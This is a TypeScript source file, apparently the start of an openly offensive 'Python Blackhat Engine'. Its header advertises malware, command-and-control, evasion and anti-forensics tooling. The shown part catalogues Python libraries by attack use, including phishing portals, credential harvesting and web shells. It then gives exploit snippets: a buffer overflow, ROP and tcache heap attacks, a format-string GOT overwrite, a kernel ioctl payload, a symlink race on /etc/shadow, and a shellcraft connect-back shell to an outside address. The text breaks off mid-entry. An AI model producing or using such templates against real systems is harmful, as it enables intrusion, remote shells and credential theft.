/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║                                                                             ║
 * ║          🐍  P Y T H O N   B L A C K H A T   E N G I N E                   ║
 * ║                                                                             ║
 * ║   Comprehensive Python offensive security knowledge engine:                  ║
 * ║     recon → exploit → persist → escalate → exfiltrate → evade               ║
 * ║                                                                             ║
 * ║     • Python exploit development (pwntools, ROP, shellcode, heap)           ║
 * ║     • Python malware engineering (RATs, keyloggers, rootkits, implants)     ║
 * ║     • Python network attacks (ARP/DNS spoof, MITM, WiFi, injection)         ║
 * ║     • Python web exploitation (SQLi, XSS, SSRF, SSTI, web shells)          ║
 * ║     • Python reverse engineering (binary analysis, disasm, debugging)        ║
 * ║     • Python cryptographic attacks (hash crack, cipher, passwords)           ║
 * ║     • Python reconnaissance (OSINT, scanning, enum, fingerprint)            ║
 * ║     • Python privilege escalation (Linux/Windows, kernel exploits)           ║
 * ║     • Python C2 frameworks (covert channels, DNS tunnel, HTTP C2)           ║
 * ║     • Python evasion & obfuscation (AV/EDR bypass, sandbox detect)          ║
 * ║     • Python forensics evasion (anti-forensics, log clear, timestomp)       ║
 * ║     • Python social engineering (phishing, credential harvest)               ║
 * ║                                                                             ║
 * ║   60+ Python libraries • 250+ attack techniques • 100+ tool templates        ║
 * ║   No external dependencies. Fully self-contained.                           ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

// ── Helpers ──────────────────────────────────────────────────────────────────

function round2(n: number): number {
  return Math.round(n * 100) / 100
}
function clamp(n: number, lo: number, hi: number): number {
  return Math.max(lo, Math.min(hi, n))
}
function genId(prefix: string): string {
  return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`
}

// ── Types ────────────────────────────────────────────────────────────────────

export interface PythonBlackHatConfig {
  maxTools: number
  enableExploitDev: boolean
  enableMalware: boolean
  enableNetworkAttacks: boolean
  enableWebExploitation: boolean
  enableReverseEngineering: boolean
  enableCryptoAttacks: boolean
  enableRecon: boolean
  enablePrivEsc: boolean
  enableC2: boolean
  enableEvasion: boolean
  enableForensicsEvasion: boolean
  enableSocialEngineering: boolean
}

export interface PythonBlackHatStats {
  totalToolsGenerated: number
  totalExploitsCreated: number
  totalAttacksCrafted: number
  totalReconScans: number
  totalMalwareSamples: number
  totalEvasionTechniques: number
  totalC2Configs: number
  totalPrivEscPaths: number
  totalCryptoAttacks: number
  totalSocialEngineering: number
  totalForensicsEvasion: number
  totalReverseEngineering: number
  totalLookups: number
  feedbackCount: number
}

export type AttackDomain =
  | 'exploit_dev'
  | 'malware'
  | 'network_attack'
  | 'web_exploitation'
  | 'reverse_engineering'
  | 'crypto_attack'
  | 'reconnaissance'
  | 'privilege_escalation'
  | 'c2_framework'
  | 'evasion'
  | 'forensics_evasion'
  | 'social_engineering'

export type Difficulty = 'beginner' | 'intermediate' | 'advanced' | 'expert'
export type TargetOS = 'linux' | 'windows' | 'macos' | 'cross_platform'

export interface PythonTool {
  id: string
  name: string
  domain: AttackDomain
  description: string
  pythonLibraries: string[]
  codeTemplate: string
  difficulty: Difficulty
  targetOS: TargetOS
  mitreTechnique: string
  stealthRating: number
  reliability: number
  prerequisites: string[]
  detection: string[]
  countermeasures: string[]
}

export interface PythonLibraryProfile {
  name: string
  pipPackage: string
  domain: AttackDomain
  description: string
  keyFeatures: string[]
  commonUseCases: string[]
  version: string
  dependencies: string[]
}

export interface ExploitDevTechnique {
  id: string
  name: string
  category:
    | 'buffer_overflow'
    | 'rop_chain'
    | 'heap_exploit'
    | 'format_string'
    | 'shellcode'
    | 'kernel_exploit'
    | 'fuzzing'
    | 'race_condition'
  description: string
  pythonCode: string
  libraries: string[]
  difficulty: Difficulty
  platform: TargetOS
}

export interface MalwareTechnique {
  id: string
  name: string
  category:
    | 'rat'
    | 'keylogger'
    | 'rootkit'
    | 'backdoor'
    | 'ransomware_sim'
    | 'worm'
    | 'dropper'
    | 'implant'
    | 'stealer'
    | 'botnet_agent'
  description: string
  pythonApproach: string
  libraries: string[]
  capabilities: string[]
  evasionFeatures: string[]
  difficulty: Difficulty
}

export interface NetworkAttack {
  id: string
  name: string
  category:
    | 'arp_spoof'
    | 'dns_spoof'
    | 'mitm'
    | 'wifi_attack'
    | 'packet_injection'
    | 'dos'
    | 'dhcp_attack'
    | 'vlan_hopping'
    | 'sniffing'
    | 'tunnel'
  description: string
  pythonApproach: string
  libraries: string[]
  targetLayer: 'layer2' | 'layer3' | 'layer4' | 'layer7' | 'wireless'
  difficulty: Difficulty
}

export interface WebExploit {
  id: string
  name: string
  category:
    | 'sqli'
    | 'xss'
    | 'ssrf'
    | 'ssti'
    | 'lfi_rfi'
    | 'rce'
    | 'auth_bypass'
    | 'xxe'
    | 'deserialization'
    | 'api_abuse'
    | 'web_shell'
  description: string
  pythonApproach: string
  libraries: string[]
  owaspCategory: string
  difficulty: Difficulty
}

export interface PrivEscPath {
  id: string
  name: string
  platform: TargetOS
  category:
    | 'suid'
    | 'sudo'
    | 'kernel'
    | 'cron'
    | 'capabilities'
    | 'service'
    | 'registry'
    | 'token'
    | 'dll_hijack'
    | 'path_hijack'
    | 'unquoted_service'
  description: string
  pythonApproach: string
  prerequisites: string[]
  successRate: number
}

export interface C2Config {
  id: string
  name: string
  protocol:
    | 'http'
    | 'https'
    | 'dns'
    | 'icmp'
    | 'websocket'
    | 'smtp'
    | 'custom_tcp'
    | 'p2p'
    | 'cloud_api'
    | 'social_media'
  description: string
  pythonApproach: string
  libraries: string[]
  stealthRating: number
  features: string[]
}

export interface EvasionMethod {
  id: string
  name: string
  category:
    | 'av_bypass'
    | 'edr_bypass'
    | 'sandbox_detect'
    | 'amsi_bypass'
    | 'etw_bypass'
    | 'obfuscation'
    | 'packing'
    | 'process_hollowing'
    | 'unhooking'
    | 'timestomping'
  description: string
  pythonApproach: string
  targetDefense: string
  effectiveness: number
}

export interface ReconTechnique {
  id: string
  name: string
  category:
    | 'port_scan'
    | 'osint'
    | 'subdomain_enum'
    | 'dns_enum'
    | 'web_fingerprint'
    | 'email_harvest'
    | 'social_recon'
    | 'vuln_scan'
    | 'network_map'
    | 'service_enum'
  description: string
  pythonApproach: string
  libraries: string[]
  passiveOrActive: 'passive' | 'active'
  difficulty: Difficulty
}

// ── Default Config ───────────────────────────────────────────────────────────

export interface CryptoAttack {
  id: string
  name: string
  category:
    | 'hash_cracking'
    | 'cipher_attack'
    | 'password_attack'
    | 'key_recovery'
    | 'protocol_attack'
    | 'rng_exploit'
    | 'side_channel'
    | 'certificate_attack'
  description: string
  pythonApproach: string
  libraries: string[]
  targetAlgorithm: string
  difficulty: Difficulty
}

export interface SocialEngineeringAttack {
  id: string
  name: string
  category:
    | 'phishing'
    | 'spear_phishing'
    | 'vishing'
    | 'smishing'
    | 'pretexting'
    | 'baiting'
    | 'credential_harvest'
    | 'watering_hole'
  description: string
  pythonApproach: string
  libraries: string[]
  targetVector: string
  successRate: number
  difficulty: Difficulty
}

export interface ForensicsEvasionTechnique {
  id: string
  name: string
  category:
    | 'log_clearing'
    | 'timestomping'
    | 'artifact_removal'
    | 'memory_wiping'
    | 'disk_wiping'
    | 'anti_forensics'
    | 'steganography'
    | 'covert_storage'
  description: string
  pythonApproach: string
  libraries: string[]
  targetArtifact: string
  effectiveness: number
}

export interface ReverseEngineeringTechnique {
  id: string
  name: string
  category:
    | 'static_analysis'
    | 'dynamic_analysis'
    | 'disassembly'
    | 'decompilation'
    | 'debugging'
    | 'unpacking'
    | 'anti_reversing'
    | 'binary_patching'
    | 'protocol_reversing'
    | 'firmware_analysis'
  description: string
  pythonApproach: string
  libraries: string[]
  targetFormat: string
  difficulty: Difficulty
}

export const DEFAULT_PYTHON_BLACKHAT_CONFIG: PythonBlackHatConfig = {
  maxTools: 200,
  enableExploitDev: true,
  enableMalware: true,
  enableNetworkAttacks: true,
  enableWebExploitation: true,
  enableReverseEngineering: true,
  enableCryptoAttacks: true,
  enableRecon: true,
  enablePrivEsc: true,
  enableC2: true,
  enableEvasion: true,
  enableForensicsEvasion: true,
  enableSocialEngineering: true,
}

// ── Private Builders ─────────────────────────────────────────────────────────

function buildPythonLibraries(): PythonLibraryProfile[] {
  const db: PythonLibraryProfile[] = []
  const add = (l: PythonLibraryProfile) => {
    db.push(l)
  }

  // Core offensive libraries
  add({
    name: 'pwntools',
    pipPackage: 'pwntools',
    domain: 'exploit_dev',
    description: 'CTF and binary exploitation framework with ELF/ROP/shellcraft support',
    keyFeatures: [
      'ROP chain building',
      'Shellcode generation',
      'ELF parsing',
      'GDB integration',
      'Remote/local process I/O',
      'Format string automation',
    ],
    commonUseCases: [
      'Buffer overflow exploitation',
      'ROP chain construction',
      'Shellcode crafting',
      'CTF challenges',
    ],
    version: '4.12',
    dependencies: ['capstone', 'unicorn', 'paramiko'],
  })
  add({
    name: 'scapy',
    pipPackage: 'scapy',
    domain: 'network_attack',
    description: 'Powerful interactive packet manipulation library',
    keyFeatures: [
      'Packet crafting',
      'Protocol dissection',
      'Network scanning',
      'Wireless attacks',
      'ARP spoofing',
      'DNS manipulation',
    ],
    commonUseCases: [
      'ARP spoofing',
      'Packet sniffing',
      'Network reconnaissance',
      'Protocol analysis',
    ],
    version: '2.5',
    dependencies: [],
  })
  add({
    name: 'impacket',
    pipPackage: 'impacket',
    domain: 'network_attack',
    description: 'Collection of Python classes for working with network protocols',
    keyFeatures: [
      'SMB/NTLM authentication',
      'Kerberos attacks',
      'DCOM/WMI execution',
      'DCE/RPC',
      'LDAP operations',
      'MSSQL client',
    ],
    commonUseCases: [
      'Pass-the-hash attacks',
      'Kerberoasting',
      'DCSync attacks',
      'Remote command execution',
    ],
    version: '0.11',
    dependencies: ['pycryptodomex', 'ldap3'],
  })
  add({
    name: 'paramiko',
    pipPackage: 'paramiko',
    domain: 'network_attack',
    description: 'SSHv2 protocol implementation for Python',
    keyFeatures: [
      'SSH client/server',
      'SFTP operations',
      'SSH tunneling',
      'Key management',
      'Agent forwarding',
    ],
    commonUseCases: [
      'SSH brute forcing',
      'SSH tunneling',
      'Remote command execution',
      'SFTP file transfer',
    ],
    version: '3.4',
    dependencies: ['bcrypt', 'cryptography'],
  })
  add({
    name: 'requests',
    pipPackage: 'requests',
    domain: 'web_exploitation',
    description: 'HTTP library for Python with session management',
    keyFeatures: [
      'Session cookies',
      'Proxy support',
      'SSL/TLS handling',
      'Multipart upload',
      'Authentication',
    ],
    commonUseCases: ['Web scraping', 'API exploitation', 'HTTP fuzzing', 'Session hijacking'],
    version: '2.31',
    dependencies: ['urllib3', 'certifi'],
  })
  add({
    name: 'beautifulsoup4',
    pipPackage: 'beautifulsoup4',
    domain: 'reconnaissance',
    description: 'HTML/XML parsing library for web scraping',
    keyFeatures: [
      'HTML parsing',
      'CSS selectors',
      'Tag navigation',
      'Search/filter',
      'Encoding detection',
    ],
    commonUseCases: ['Web scraping', 'Data extraction', 'OSINT gathering', 'Content analysis'],
    version: '4.12',
    dependencies: ['lxml', 'html5lib'],
  })
  add({
    name: 'sqlmap',
    pipPackage: 'sqlmap (pip install sqlmap or clone from github.com/sqlmapproject/sqlmap)',
    domain: 'web_exploitation',
    description:
      'Automatic SQL injection and database takeover tool (standalone CLI tool with Python API)',
    keyFeatures: [
      'Blind SQLi',
      'UNION-based SQLi',
      'Time-based SQLi',
      'Error-based SQLi',
      'Database fingerprint',
      'OS shell',
    ],
    commonUseCases: [
      'SQL injection automation',
      'Database extraction',
      'OS command execution',
      'File read/write',
    ],
    version: '1.7',
    dependencies: [],
  })
  add({
    name: 'pycryptodome',
    pipPackage: 'pycryptodome',
    domain: 'crypto_attack',
    description: 'Self-contained Python package for cryptographic recipes',
    keyFeatures: [
      'AES/DES/RSA',
      'Hash functions',
      'MACs',
      'Key derivation',
      'Random number generation',
      'PKCS padding',
    ],
    commonUseCases: [
      'Encrypted communications',
      'Hash cracking helpers',
      'Cryptographic analysis',
      'Secure payload encryption',
    ],
    version: '3.19',
    dependencies: [],
  })
  add({
    name: 'angr',
    pipPackage: 'angr',
    domain: 'reverse_engineering',
    description: 'Platform-agnostic binary analysis framework with symbolic execution',
    keyFeatures: [
      'Symbolic execution',
      'Binary lifting (VEX IR)',
      'Control flow analysis',
      'Constraint solving',
      'Auto-exploit generation',
      'CFG recovery',
    ],
    commonUseCases: [
      'Binary analysis',
      'Vulnerability discovery',
      'Automatic exploit generation',
      'CTF reverse engineering',
    ],
    version: '9.2',
    dependencies: ['claripy', 'archinfo', 'cle'],
  })
  add({
    name: 'volatility3',
    pipPackage: 'volatility3',
    domain: 'forensics_evasion',
    description: 'Memory forensics framework for incident response',
    keyFeatures: [
      'Memory dump analysis',
      'Process listing',
      'DLL extraction',
      'Network connections',
      'Registry hives',
      'Malware detection',
    ],
    commonUseCases: [
      'Memory forensics',
      'Malware analysis',
      'Incident response',
      'Anti-forensics research',
    ],
    version: '2.5',
    dependencies: ['yara-python', 'pefile'],
  })
  add({
    name: 'frida',
    pipPackage: 'frida-tools',
    domain: 'reverse_engineering',
    description: 'Dynamic instrumentation toolkit for developers and security researchers',
    keyFeatures: [
      'Process injection',
      'Function hooking',
      'Memory manipulation',
      'JavaScript engine',
      'Cross-platform',
      'API tracing',
    ],
    commonUseCases: ['Runtime analysis', 'API hooking', 'Anti-tamper bypass', 'Mobile app testing'],
    version: '16.1',
    dependencies: [],
  })
  add({
    name: 'capstone',
    pipPackage: 'capstone',
    domain: 'reverse_engineering',
    description: 'Lightweight multi-arch disassembly framework',
    keyFeatures: [
      'x86/x64 disasm',
      'ARM/ARM64',
      'MIPS',
      'PowerPC',
      'Instruction details',
      'Python bindings',
    ],
    commonUseCases: ['Binary disassembly', 'Shellcode analysis', 'Gadget finding', 'Code analysis'],
    version: '5.0',
    dependencies: [],
  })
  add({
    name: 'keystone-engine',
    pipPackage: 'keystone-engine',
    domain: 'exploit_dev',
    description: 'Lightweight multi-arch assembler framework',
    keyFeatures: ['x86/x64 assembly', 'ARM/ARM64', 'Multi-syntax', 'Python bindings'],
    commonUseCases: ['Shellcode assembly', 'Instruction patching', 'Exploit development'],
    version: '0.9',
    dependencies: [],
  })
  add({
    name: 'unicorn',
    pipPackage: 'unicorn',
    domain: 'reverse_engineering',
    description: 'Lightweight multi-arch CPU emulator framework',
    keyFeatures: ['CPU emulation', 'Hook callbacks', 'Memory mapping', 'Multi-arch support'],
    commonUseCases: ['Code emulation', 'Unpacking', 'Malware analysis', 'Fuzzing'],
    version: '2.0',
    dependencies: [],
  })
  add({
    name: 'ropper',
    pipPackage: 'ropper',
    domain: 'exploit_dev',
    description: 'Display information about files in different formats and find ROP gadgets',
    keyFeatures: [
      'ROP gadget search',
      'JOP gadgets',
      'Semantic search',
      'Chain building',
      'Multi-format support',
    ],
    commonUseCases: ['ROP chain building', 'Gadget discovery', 'Exploit development'],
    version: '1.13',
    dependencies: ['capstone', 'filebytes'],
  })
  add({
    name: 'z3-solver',
    pipPackage: 'z3-solver',
    domain: 'reverse_engineering',
    description: 'Microsoft Z3 theorem prover and SMT solver',
    keyFeatures: [
      'SMT solving',
      'Constraint solving',
      'Symbolic execution support',
      'Bit-vector operations',
    ],
    commonUseCases: ['Keygen solving', 'Constraint solving in RE', 'Symbolic execution'],
    version: '4.12',
    dependencies: [],
  })
  add({
    name: 'mitmproxy',
    pipPackage: 'mitmproxy',
    domain: 'network_attack',
    description: 'Interactive HTTPS proxy for penetration testers',
    keyFeatures: [
      'HTTP/HTTPS interception',
      'Flow modification',
      'Scripting API',
      'WebSocket support',
      'Certificate handling',
    ],
    commonUseCases: ['MITM attacks', 'Traffic analysis', 'API testing', 'SSL inspection'],
    version: '10.1',
    dependencies: ['cryptography', 'h2'],
  })
  add({
    name: 'dnspython',
    pipPackage: 'dnspython',
    domain: 'reconnaissance',
    description: 'DNS toolkit for Python supporting all record types',
    keyFeatures: ['DNS queries', 'Zone transfer', 'DNSSEC', 'Dynamic updates', 'All record types'],
    commonUseCases: [
      'DNS enumeration',
      'DNS tunneling',
      'Zone transfer attacks',
      'DNS reconnaissance',
    ],
    version: '2.4',
    dependencies: [],
  })
  add({
    name: 'ldap3',
    pipPackage: 'ldap3',
    domain: 'network_attack',
    description: 'Strictly RFC 4510 conforming LDAP V3 client library',
    keyFeatures: [
      'LDAP bind',
      'Search/filter',
      'Modify operations',
      'SSL/TLS',
      'SASL authentication',
    ],
    commonUseCases: ['AD enumeration', 'LDAP injection', 'User enumeration', 'Password spraying'],
    version: '2.9',
    dependencies: [],
  })
  add({
    name: 'python-nmap',
    pipPackage: 'python-nmap',
    domain: 'reconnaissance',
    description: 'Python wrapper for nmap port scanning',
    keyFeatures: [
      'Port scanning',
      'Service detection',
      'OS fingerprint',
      'NSE scripts',
      'XML parsing',
    ],
    commonUseCases: [
      'Port scanning',
      'Network mapping',
      'Service enumeration',
      'Vulnerability scanning',
    ],
    version: '0.7',
    dependencies: [],
  })
  add({
    name: 'hashid',
    pipPackage: 'hashid',
    domain: 'crypto_attack',
    description:
      'Hash identification and analysis tool for identifying hash types (companion to external hashcat binary)',
    keyFeatures: [
      'Hash type identification',
      'Algorithm detection',
      'Multi-hash support',
      'hashcat/john mode mapping',
    ],
    commonUseCases: [
      'Hash type identification',
      'Pre-cracking analysis',
      'Hash algorithm detection',
      'Wordlist preparation',
    ],
    version: '3.1',
    dependencies: [],
  })
  add({
    name: 'yara-python',
    pipPackage: 'yara-python',
    domain: 'evasion',
    description: 'YARA pattern matching for malware research',
    keyFeatures: [
      'Pattern matching',
      'Rule compilation',
      'Module support',
      'Hex patterns',
      'Regex support',
    ],
    commonUseCases: [
      'Malware detection testing',
      'Signature evasion',
      'Threat hunting',
      'IOC scanning',
    ],
    version: '4.3',
    dependencies: [],
  })
  add({
    name: 'pefile',
    pipPackage: 'pefile',
    domain: 'reverse_engineering',
    description: 'PE file parser for Windows executable analysis',
    keyFeatures: [
      'PE header parsing',
      'Import/export tables',
      'Section analysis',
      'Resource extraction',
      'Overlay detection',
    ],
    commonUseCases: [
      'PE analysis',
      'Malware analysis',
      'Packer detection',
      'Import reconstruction',
    ],
    version: '2023.2',
    dependencies: [],
  })
  add({
    name: 'selenium',
    pipPackage: 'selenium',
    domain: 'social_engineering',
    description: 'Browser automation for web testing and automation',
    keyFeatures: [
      'Browser control',
      'JavaScript execution',
      'Form filling',
      'Screenshot capture',
      'Cookie management',
    ],
    commonUseCases: [
      'Credential harvesting',
      'Automated phishing',
      'Web scraping',
      'Browser fingerprinting',
    ],
    version: '4.15',
    dependencies: ['urllib3'],
  })

  // Additional libraries for new domains
  add({
    name: 'lief',
    pipPackage: 'lief',
    domain: 'reverse_engineering',
    description:
      'Library to Instrument Executable Formats — parse, modify and rebuild PE, ELF, Mach-O and OAT files',
    keyFeatures: [
      'PE/ELF/Mach-O parsing',
      'Binary modification',
      'Section injection',
      'Import/export manipulation',
      'Rebuilding binaries',
    ],
    commonUseCases: [
      'Binary patching',
      'Malware analysis',
      'Code injection',
      'Import table modification',
    ],
    version: '0.14',
    dependencies: [],
  })
  add({
    name: 'pyelftools',
    pipPackage: 'pyelftools',
    domain: 'reverse_engineering',
    description: 'Pure-Python library for parsing ELF and DWARF files',
    keyFeatures: [
      'ELF parsing',
      'DWARF debug info',
      'Section analysis',
      'Symbol tables',
      'Relocation entries',
    ],
    commonUseCases: [
      'ELF analysis',
      'Debug info extraction',
      'Symbol resolution',
      'Binary analysis',
    ],
    version: '0.31',
    dependencies: [],
  })
  add({
    name: 'binwalk',
    pipPackage: 'binwalk',
    domain: 'reverse_engineering',
    description:
      'Firmware analysis tool for scanning and extracting embedded files from firmware images',
    keyFeatures: [
      'Signature scanning',
      'File extraction',
      'Entropy analysis',
      'Recursive extraction',
      'Custom signatures',
    ],
    commonUseCases: [
      'Firmware analysis',
      'Embedded file extraction',
      'IoT security',
      'File carving',
    ],
    version: '2.3',
    dependencies: [],
  })
  add({
    name: 'gmpy2',
    pipPackage: 'gmpy2',
    domain: 'crypto_attack',
    description:
      'GMP/MPIR, MPFR, and MPC interface for Python — fast arbitrary precision arithmetic for cryptographic computations',
    keyFeatures: [
      'Large integer arithmetic',
      'Modular exponentiation',
      'GCD/LCM',
      'Primality testing',
      'Number theory functions',
    ],
    commonUseCases: ['RSA attacks', 'Factorization', 'Discrete logarithm', 'Elliptic curve math'],
    version: '2.1',
    dependencies: [],
  })
  add({
    name: 'sympy',
    pipPackage: 'sympy',
    domain: 'crypto_attack',
    description:
      'Symbolic mathematics library for Python — algebraic computation for cryptanalysis',
    keyFeatures: [
      'Symbolic math',
      'Number theory',
      'Equation solving',
      'Polynomial factoring',
      'Continued fractions',
    ],
    commonUseCases: [
      'RSA key recovery',
      'Mathematical cryptanalysis',
      'Lattice reduction',
      'Equation systems',
    ],
    version: '1.12',
    dependencies: [],
  })
  add({
    name: 'pillow',
    pipPackage: 'pillow',
    domain: 'forensics_evasion',
    description: 'Python Imaging Library fork for image processing and manipulation',
    keyFeatures: [
      'Image reading/writing',
      'Pixel manipulation',
      'Format conversion',
      'Image filtering',
      'Metadata access',
    ],
    commonUseCases: [
      'Image steganography',
      'Screenshot capture',
      'Visual reconnaissance',
      'Metadata extraction',
    ],
    version: '10.2',
    dependencies: [],
  })
  add({
    name: 'aiohttp',
    pipPackage: 'aiohttp',
    domain: 'web_exploitation',
    description: 'Asynchronous HTTP client/server framework for asyncio',
    keyFeatures: [
      'Async HTTP client',
      'WebSocket support',
      'Connection pooling',
      'Middleware',
      'Rate limiting',
    ],
    commonUseCases: [
      'Async scanning',
      'Race condition exploitation',
      'High-concurrency attacks',
      'WebSocket fuzzing',
    ],
    version: '3.9',
    dependencies: ['asyncio'],
  })
  add({
    name: 'psutil',
    pipPackage: 'psutil',
    domain: 'evasion',
    description: 'Cross-platform library for process and system utilization monitoring',
    keyFeatures: [
      'Process listing',
      'CPU/memory info',
      'Disk usage',
      'Network connections',
      'System boot time',
    ],
    commonUseCases: [
      'Sandbox detection',
      'Process monitoring',
      'System enumeration',
      'Anti-analysis checks',
    ],
    version: '5.9',
    dependencies: [],
  })
  add({
    name: 'web3',
    pipPackage: 'web3',
    domain: 'network_attack',
    description: 'Python library for interacting with Ethereum blockchain and smart contracts',
    keyFeatures: [
      'Ethereum interaction',
      'Smart contract calls',
      'Transaction signing',
      'Event filtering',
      'ABI encoding',
    ],
    commonUseCases: [
      'Blockchain C2',
      'Smart contract exploitation',
      'Crypto address monitoring',
      'Decentralized communication',
    ],
    version: '6.15',
    dependencies: ['eth-abi'],
  })
  add({
    name: 'twilio',
    pipPackage: 'twilio',
    domain: 'social_engineering',
    description: 'Twilio API client for SMS, voice, and communication platform interactions',
    keyFeatures: [
      'SMS sending',
      'Voice calls',
      'Phone verification',
      'Message tracking',
      'Bulk messaging',
    ],
    commonUseCases: [
      'SMS phishing',
      'Vishing automation',
      'Phone verification bypass',
      'Communication spoofing',
    ],
    version: '8.12',
    dependencies: [],
  })
  add({
    name: 'flask',
    pipPackage: 'flask',
    domain: 'social_engineering',
    description: 'Lightweight WSGI web application framework for Python',
    keyFeatures: [
      'HTTP routing',
      'Template rendering',
      'Session management',
      'Request handling',
      'Extension ecosystem',
    ],
    commonUseCases: ['Phishing portals', 'C2 servers', 'Web shells', 'Credential harvesting'],
    version: '3.0',
    dependencies: ['jinja2', 'werkzeug'],
  })
  add({
    name: 'dnfile',
    pipPackage: 'dnfile',
    domain: 'reverse_engineering',
    description:
      '.NET PE file parser for Python — parse .NET assembly metadata, streams, and tables',
    keyFeatures: [
      '.NET metadata parsing',
      'Stream analysis',
      'Table parsing',
      'String extraction',
      'Assembly info',
    ],
    commonUseCases: [
      '.NET malware analysis',
      'Assembly deobfuscation',
      'Metadata extraction',
      '.NET RE',
    ],
    version: '0.14',
    dependencies: [],
  })
  add({
    name: 'ecdsa',
    pipPackage: 'ecdsa',
    domain: 'crypto_attack',
    description:
      'Pure-Python ECDSA and ECDH implementation for elliptic curve cryptography operations',
    keyFeatures: [
      'ECDSA sign/verify',
      'Key generation',
      'Curve support',
      'DER encoding',
      'RFC6979 deterministic nonce',
    ],
    commonUseCases: [
      'ECDSA nonce attacks',
      'Key recovery',
      'Signature forgery testing',
      'Curve analysis',
    ],
    version: '0.19',
    dependencies: [],
  })
  add({
    name: 'boto3',
    pipPackage: 'boto3',
    domain: 'reconnaissance',
    description:
      'AWS SDK for Python — interact with Amazon Web Services for cloud security assessment',
    keyFeatures: [
      'S3 operations',
      'IAM enumeration',
      'EC2 management',
      'Lambda functions',
      'CloudTrail access',
    ],
    commonUseCases: [
      'Cloud enumeration',
      'S3 bucket auditing',
      'IAM analysis',
      'AWS privilege escalation',
    ],
    version: '1.34',
    dependencies: ['botocore'],
  })
  add({
    name: 'pygithub',
    pipPackage: 'pygithub',
    domain: 'reconnaissance',
    description: 'Python client for GitHub API v3 — search repositories, code, and users for OSINT',
    keyFeatures: [
      'Repository search',
      'Code search',
      'User enumeration',
      'Gist access',
      'Organization data',
    ],
    commonUseCases: [
      'GitHub dorking',
      'Credential hunting',
      'Code reconnaissance',
      'Developer OSINT',
    ],
    version: '2.1',
    dependencies: ['requests'],
  })
  add({
    name: 'ghidra-bridge',
    pipPackage: 'ghidra-bridge',
    domain: 'reverse_engineering',
    description:
      'Python RPC bridge for Ghidra — access Ghidra decompiler and analysis from external Python scripts',
    keyFeatures: [
      'Remote Ghidra access',
      'Decompilation API',
      'Function analysis',
      'Cross-reference queries',
      'Script automation',
    ],
    commonUseCases: [
      'Automated decompilation',
      'Batch analysis',
      'External scripting',
      'IDE integration',
    ],
    version: '0.3',
    dependencies: [],
  })

  return db
}

function buildExploitDevTechniques(): ExploitDevTechnique[] {
  const db: ExploitDevTechnique[] = []
  const add = (t: ExploitDevTechnique) => {
    db.push(t)
  }

  add({
    id: 'pyexp-bof-pwntools',
    name: 'Buffer Overflow with pwntools',
    category: 'buffer_overflow',
    description:
      'Stack buffer overflow exploitation using pwntools ELF parsing, pattern_create for offset finding, and p64 packing for RIP control',
    pythonCode:
      'from pwn import *; elf = ELF("./vuln"); p = process(elf.path); offset = cyclic_find(core.fault_addr); payload = flat(cyclic(offset), elf.sym["win"]); p.sendline(payload)',
    libraries: ['pwntools'],
    difficulty: 'intermediate',
    platform: 'linux',
  })
  add({
    id: 'pyexp-rop-chain',
    name: 'ROP Chain Construction',
    category: 'rop_chain',
    description:
      'Automated ROP chain building with pwntools ROP class — pop_rdi gadgets, ret2libc, ret2system with ASLR leak',
    pythonCode:
      'from pwn import *; elf = ELF("./vuln"); rop = ROP(elf); rop.call("puts", [elf.got["puts"]]); rop.call(elf.sym["main"]); payload = flat(cyclic(offset), rop.chain())',
    libraries: ['pwntools', 'ropper'],
    difficulty: 'advanced',
    platform: 'linux',
  })
  add({
    id: 'pyexp-heap-tcache',
    name: 'Tcache Poisoning Attack',
    category: 'heap_exploit',
    description:
      'Exploit glibc tcache bin to achieve arbitrary write — double-free in tcache, overwrite fd pointer, allocate at target address',
    pythonCode:
      'alloc(0x20, "A"*8); alloc(0x20, "B"*8); free(0); free(1); free(0); alloc(0x20, p64(target_addr)); alloc(0x20, "C"); alloc(0x20, shellcode)',
    libraries: ['pwntools'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-fmt-string',
    name: 'Format String Exploitation',
    category: 'format_string',
    description:
      'Automated format string attack with pwntools fmtstr_payload — overwrite GOT entries, leak stack values, chain writes',
    pythonCode:
      'from pwn import *; p = process("./vuln"); p.sendline(b"%p."*20); leak = p.recvline(); payload = fmtstr_payload(offset, {elf.got["printf"]: elf.sym["win"]})',
    libraries: ['pwntools'],
    difficulty: 'advanced',
    platform: 'linux',
  })
  add({
    id: 'pyexp-shellcraft',
    name: 'Shellcode with shellcraft',
    category: 'shellcode',
    description:
      'Multi-architecture shellcode generation using pwntools shellcraft — execve, connect-back, staged payloads with encoders',
    pythonCode:
      'from pwn import *; context.arch = "amd64"; sc = shellcraft.sh(); payload = asm(sc); # or shellcraft.connect("10.0.0.1", 4444) + shellcraft.dupsh()',
    libraries: ['pwntools', 'keystone-engine'],
    difficulty: 'intermediate',
    platform: 'linux',
  })
  add({
    id: 'pyexp-kernel',
    name: 'Kernel Exploit Development',
    category: 'kernel_exploit',
    description:
      'Linux kernel exploitation using Python — struct packing for ioctl, /dev interaction, commit_creds(prepare_kernel_cred(0)) ROP',
    pythonCode:
      'import struct, ctypes; fd = os.open("/dev/vuln", os.O_RDWR); payload = struct.pack("<Q", kaslr_base + commit_creds_offset); os.ioctl(fd, IOCTL_CODE, payload)',
    libraries: ['pwntools', 'ctypes'],
    difficulty: 'expert',
    platform: 'linux',
  })
  add({
    id: 'pyexp-fuzzing',
    name: 'Protocol Fuzzing with boofuzz',
    category: 'fuzzing',
    description:
      'Network protocol fuzzing with boofuzz — session-based fuzzing, block definitions, callbacks, crash detection',
    pythonCode:
      'from boofuzz import *; session = Session(target=Target(connection=TCPSocketConnection("target", 80))); s_initialize("HTTP"); s_string("GET"); s_delim(" "); s_string("/index.html"); session.connect(s_get("HTTP")); session.fuzz()',
    libraries: ['boofuzz'],
    difficulty: 'intermediate',
    platform: 'cross_platform',
  })
  add({
    id: 'pyexp-race',
    name: 'Race Condition Exploitation',
    category: 'race_condition',
    description:
      'TOCTOU race condition exploitation with Python threading — symlink races, file race attacks, concurrent request flooding',
    pythonCode:
      'import threading, os; def racer(): while True: os.symlink("/etc/shadow", "/tmp/target"); os.unlink("/tmp/target"); threads = [threading.Thread(target=racer) for _ in range(10)]; [t.start() for t in threads]',
    libraries: ['threading'],
    difficulty: 'advanced',
    platform: 'linux',
  })

  // Additional exploit dev techniques
  add({
    id: 'pyexp-uaf',
    name: 'Use-After-Free Exploitation',
    category: 'heap_exploit',
    description:
